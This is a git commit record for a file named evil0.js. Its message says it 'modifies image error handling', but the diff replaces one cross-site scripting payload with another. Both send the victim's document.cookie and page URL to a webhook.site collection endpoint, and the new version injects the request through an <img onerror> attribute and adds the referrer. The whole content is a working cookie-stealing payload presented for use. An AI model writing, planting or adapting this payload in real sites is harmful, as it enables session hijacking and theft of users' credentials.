ebd467e9428a18dbb0bc3d513f164431ca72daa2
Tasty <94216260+tastyshu@users.noreply.github.com>
2025-11-15 13:34:49 +0300

    Modify image error handling to send cookies and referrer

--- evil0.js
+++ evil0.js
@@ -1,1 +1,1 @@
-new Image().src = 'https://webhook.site/cbaeca30-f5c4-4055-90ad-06a4f9eba402?c=' + encodeURIComponent(document.cookie) + '&u=' + encodeURIComponent(location.href) + '&t=' + Date.now();
+<img src=x onerror="new Image().src='https://webhook.site/cbaeca30-f5c4-4055-90ad-06a4f9eba402?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href)+'&r='+encodeURIComponent(document.referrer)+'&t='+Date.now()">
